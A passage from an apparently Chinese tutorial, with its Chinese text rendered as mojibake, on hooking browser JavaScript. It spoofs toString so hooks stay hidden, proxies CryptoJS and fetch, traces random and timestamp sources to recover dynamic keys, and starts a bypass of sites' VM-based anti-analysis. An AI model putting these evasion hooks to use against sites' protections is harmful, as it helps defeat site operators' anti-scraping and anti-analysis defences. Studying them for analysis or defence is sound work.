<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalToString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>

<span class="w">    </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">callback</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// ä¼ªé€  toString</span>
<span class="w">    </span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">].</span><span class="nx">toString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalToString</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// éšè— Proxy ç‰¹å¾</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">obj</span><span class="p">[</span><span class="nx">methodName</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">name</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="é€’å½’-hook-è‡ªåŠ¨å‘ç°å’Œ-hook-æ–°æ–¹æ³•">é€’å½’ Hook - è‡ªåŠ¨å‘ç°å’Œ Hook æ–°æ–¹æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è‡ªåŠ¨ Hook æ‰€æœ‰è¢«è°ƒç”¨çš„åŠ å¯†æ–¹æ³•</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hookedMethods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">();</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">autoHook</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">prefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;CryptoJS&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">get</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">prop</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">target</span><span class="p">[</span><span class="nx">prop</span><span class="p">];</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">fullName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">prefix</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nx">prop</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>

<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;function&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">hookedMethods</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">fullName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">hookedMethods</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">fullName</span><span class="p">);</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ£ è‡ªåŠ¨ Hook: </span><span class="si">${</span><span class="nx">fullName</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="nx">apply</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ” [</span><span class="si">${</span><span class="nx">fullName</span><span class="si">}</span><span class="sb">]`</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">                            </span><span class="k">return</span><span class="w"> </span><span class="nb">Reflect</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">fn</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="p">});</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;object&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">autoHook</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">fullName</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">autoHook</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">CryptoJS</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="hook-æ¡†æ¶å°è£…">Hook æ¡†æ¶å°è£…</h2>

      <h3 id="é€šç”¨-hook-ç®¡ç†å™¨">é€šç”¨ Hook ç®¡ç†å™¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">HookManager</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">hooks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">enabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// æ³¨å†Œ Hook</span>
<span class="w">    </span><span class="nx">register</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">before</span><span class="p">,</span><span class="w"> </span><span class="nx">after</span><span class="p">,</span><span class="w"> </span><span class="nx">condition</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">config</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">target</span><span class="p">[</span><span class="nx">method</span><span class="p">];</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">original</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`âš ï¸  æ–¹æ³• </span><span class="si">${</span><span class="nx">method</span><span class="si">}</span><span class="sb"> ä¸å­˜åœ¨`</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">hookId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">hooks</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>

<span class="w">        </span><span class="nx">target</span><span class="p">[</span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">enabled</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="c1">// æ¡ä»¶æ£€æŸ¥</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">condition</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">condition</span><span class="p">(</span><span class="nx">args</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="c1">// å‰ç½®å¤„ç†</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">before</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">modifiedArgs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">before</span><span class="p">(</span><span class="nx">args</span><span class="p">);</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">modifiedArgs</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="kc">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">modifiedArgs</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="c1">// è°ƒç”¨åŸå‡½æ•°</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// åç½®å¤„ç†</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">after</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">modifiedResult</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">after</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">modifiedResult</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="kc">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">modifiedResult</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">hooks</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">            </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">hookId</span><span class="p">,</span>
<span class="w">            </span><span class="nx">target</span><span class="p">,</span>
<span class="w">            </span><span class="nx">method</span><span class="p">,</span>
<span class="w">            </span><span class="nx">original</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">hookId</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// ç§»é™¤ Hook</span>
<span class="w">    </span><span class="nx">remove</span><span class="p">(</span><span class="nx">hookId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">hook</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">hooks</span><span class="p">[</span><span class="nx">hookId</span><span class="p">];</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">hook</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">hook</span><span class="p">.</span><span class="nx">target</span><span class="p">[</span><span class="nx">hook</span><span class="p">.</span><span class="nx">method</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hook</span><span class="p">.</span><span class="nx">original</span><span class="p">;</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`âœ… Hook </span><span class="si">${</span><span class="nx">hookId</span><span class="si">}</span><span class="sb"> å·²ç§»é™¤`</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// å…¨å±€å¯ç”¨/ç¦ç”¨</span>
<span class="w">    </span><span class="nx">toggle</span><span class="p">(</span><span class="nx">enabled</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">enabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">enabled</span><span class="p">;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`ğŸ”„ Hook </span><span class="si">${</span><span class="nx">enabled</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;å¯ç”¨&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;ç¦ç”¨&#39;</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">hookManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">HookManager</span><span class="p">();</span>

<span class="c1">// Hook Fetch è¯·æ±‚</span>
<span class="nx">hookManager</span><span class="p">.</span><span class="nx">register</span><span class="p">({</span>
<span class="w">    </span><span class="nx">target</span><span class="o">:</span><span class="w"> </span><span class="nb">window</span><span class="p">,</span>
<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">before</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸŒ Fetch:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">after</span><span class="o">:</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">clone</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ“¥ Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">));</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">condition</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// åª Hook API è¯·æ±‚</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;/api/&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ä¸´æ—¶ç¦ç”¨æ‰€æœ‰ Hook</span>
<span class="nx">hookManager</span><span class="p">.</span><span class="nx">toggle</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®æˆ˜è¿›é˜¶æ¡ˆä¾‹">å®æˆ˜è¿›é˜¶æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹1-ç ´è§£åŠ¨æ€å¯†é’¥ç”Ÿæˆç®—æ³•">æ¡ˆä¾‹1: ç ´è§£åŠ¨æ€å¯†é’¥ç”Ÿæˆç®—æ³•</h3>

      <p><strong>åœºæ™¯</strong>: æ¯æ¬¡è¯·æ±‚çš„åŠ å¯†å¯†é’¥éƒ½ä¸åŒï¼Œéœ€è¦è¿½è¸ªå¯†é’¥ç”Ÿæˆé€»è¾‘</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Step 1: Hook æ‰€æœ‰å¯èƒ½çš„å¯†é’¥æ¥æº</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">keyTracker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">sources</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>

<span class="w">    </span><span class="nx">trackRandom</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalRandom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">;</span>
<span class="w">        </span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalRandom</span><span class="p">();</span>
<span class="w">            </span><span class="nx">keyTracker</span><span class="p">.</span><span class="nx">sources</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Math.random&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="p">});</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="nx">trackTimestamp</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalNow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">;</span>
<span class="w">        </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalNow</span><span class="p">();</span>
<span class="w">            </span><span class="nx">keyTracker</span><span class="p">.</span><span class="nx">sources</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Date.now&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="p">});</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="nx">trackCrypto</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">getRandomValues</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">getRandomValues</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">);</span>
<span class="w">            </span><span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">getRandomValues</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original</span><span class="p">(</span><span class="nx">array</span><span class="p">);</span>
<span class="w">                </span><span class="nx">keyTracker</span><span class="p">.</span><span class="nx">sources</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
<span class="w">                    </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;crypto.getRandomValues&#39;</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span>
<span class="w">                </span><span class="p">});</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">            </span><span class="p">};</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="nx">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">trackRandom</span><span class="p">();</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">trackTimestamp</span><span class="p">();</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">trackCrypto</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ” å¯†é’¥è¿½è¸ªå™¨å·²å¯åŠ¨&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="nx">analyze</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;=== å¯†é’¥æ¥æºåˆ†æ ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`æ€»è®¡ </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">sources</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> ä¸ªéšæœºæº`</span><span class="p">);</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">sources</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">source</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="si">}</span><span class="sb">. </span><span class="si">${</span><span class="nx">source</span><span class="p">.</span><span class="nx">type</span><span class="si">}</span><span class="sb">:`</span><span class="p">,</span><span class="w"> </span><span class="nx">source</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="nx">keyTracker</span><span class="p">.</span><span class="nx">init</span><span class="p">();</span>

<span class="c1">// è§¦å‘åŠ å¯†æ“ä½œå</span>
<span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">keyTracker</span><span class="p">.</span><span class="nx">analyze</span><span class="p">(),</span><span class="w"> </span><span class="mf">5000</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="æ¡ˆä¾‹2-ç»•è¿‡è™šæ‹Ÿæœºæ£€æµ‹">æ¡ˆä¾‹2: ç»•è¿‡è™šæ‹Ÿæœºæ£€æµ‹</h3>

      <p>æŸäº›ç½‘ç«™ä½¿ç”¨è™šæ‹Ÿæœºï¼ˆVMï¼‰æ‰§è¡Œå…³é”®ä»£ç ä»¥é˜²æ­¢åˆ†æï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹å¹¶ Hook VM ç¯å¢ƒ</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¸¸è§çš„ VM ç‰¹å¾</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">vmPatterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s1">&#39;eval&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;Function&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;with&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;Proxy&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;_0x&#39;</span><span class="p">,</span><span class="w">  </span><span class="c1">// æ··æ·†ç‰¹å¾</span>
<span class="w">        </span><span class="s1">&#39;constructor&#39;</span>
<span class="w">    </span><span class="p">];</span>

<span class="w">    </span><span class="c1">// Hook Function æ„é€ å‡½æ•°</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">OriginalFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Function</span><span class="p">;</span>
